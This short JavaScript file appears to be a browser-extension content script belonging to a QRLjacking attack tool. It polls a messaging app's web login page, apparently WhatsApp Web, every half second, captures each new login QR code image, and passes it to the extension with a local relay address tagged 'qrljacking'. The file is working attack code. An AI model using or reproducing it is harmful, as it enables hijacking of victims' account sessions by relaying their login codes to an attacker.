((url) => {
	var lastImage;
	setInterval(() => {
		const element = document.querySelector('#app > div > div > div.landing-window > div.landing-main > div > div._2d3Jz > div > img');
		const newImage = element && element.getAttribute('src');

		if(!newImage) return;
		if(newImage === lastImage) return;
		lastImage = newImage;

		const message = {
			url,
			data: {
				image: newImage
			}
		}

		chrome.runtime.sendMessage(message, response => {
			console.log(response);
		});
	}, 500);

})('http://localhost:3000/hashmap/qrljacking');
